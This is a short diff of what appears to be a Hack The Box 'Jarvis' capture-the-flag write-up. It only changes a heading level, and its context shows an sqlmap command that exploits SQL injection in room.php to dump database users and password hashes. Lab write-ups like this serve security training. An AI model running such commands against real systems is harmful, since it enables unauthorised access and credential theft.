@@ -81,7 +81,7 @@ ________________________________________________________________________________
 
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2002-19-10.png)
 
-### I used the sqlmap to dump the users and passwords hashes, the `--passwords` flag is for that
+#### I used the sqlmap to dump the users and passwords hashes, the `--passwords` flag is for that
 
 ``sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" --passwords``
 
